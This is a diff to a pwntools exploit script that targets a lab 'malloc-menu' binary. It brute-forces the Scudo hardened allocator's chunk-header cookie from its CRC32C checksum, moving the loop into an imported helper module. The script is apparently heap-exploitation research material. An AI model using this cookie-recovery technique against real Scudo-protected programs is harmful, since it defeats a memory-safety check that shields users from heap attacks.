@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 from pwn import *
+from scudocookie import bruteforce, calc_checksum
 from crc32c import crc32c
 
 elf = context.binary = ELF("../scudo-gdb-tooling/malloc-menu-linux")
@@ -79,19 +80,8 @@ def bruteforce_cookie(addr):
     checksum = header >> 0x30
     header = header & ((1 << 0x30)-1)
 
-    cookie = 0
-    crc = 0
-    while crc != checksum:
-        cookie %= (1 << 0x40)
-        cookie += 1
-        crc = crc32c(header.to_bytes(8, byteorder='big'), crc32c(addr.to_bytes(8, byteorder='big'), cookie))
-        crc = crc ^ (crc >> 0x10)
-        if cookie == 0:
-            error("Cookie not found")
-            break
-        if cookie % 10000000 == 0:
-            info(f"Cookie at {cookie}")
-            
+    cookie = bruteforce(addr, checksum, header)
+
     return cookie
 
 def populate_quarantine():
@@ -115,7 +105,9 @@ info(f"address 1: {hex(add1)} address 2: {hex(add2)}")
 write(add1, b"X"*12)
 write(add2, b"Y"*12)
 
-info(f"bruteforced cookie: {bruteforce_cookie(add1)}")
+cookie = bruteforce_cookie(add1)
+
+info(f"Bruteforced cookie: {hex(cookie)}")
 
 io.interactive()
 
